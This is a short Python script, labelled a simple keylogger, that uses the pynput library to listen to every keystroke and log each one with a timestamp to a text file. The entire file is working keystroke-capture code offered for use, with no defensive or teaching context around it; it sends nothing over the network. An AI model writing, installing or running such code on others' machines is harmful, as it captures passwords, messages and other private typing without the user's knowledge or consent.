'''This is a Simple keylogger'''

#modules imported
from pynput.keyboard import Key, Listener
import logging

#set your log location inside the quotes
#if the quotes are empty, the log file is created inside the program directory
log_location = ""

#configuring the style and appearance of the log entries
logging.basicConfig(filename=(log_location + "log.txt"), level=logging.DEBUG, format='%(asctime)s, %(message)s')

#function initiated when any key is pressed
def Key_press(key):
    logging.info(str(key))

#listens all the typings in the keyboard
with Listener(on_press=Key_press) as listener:
	listener.join()
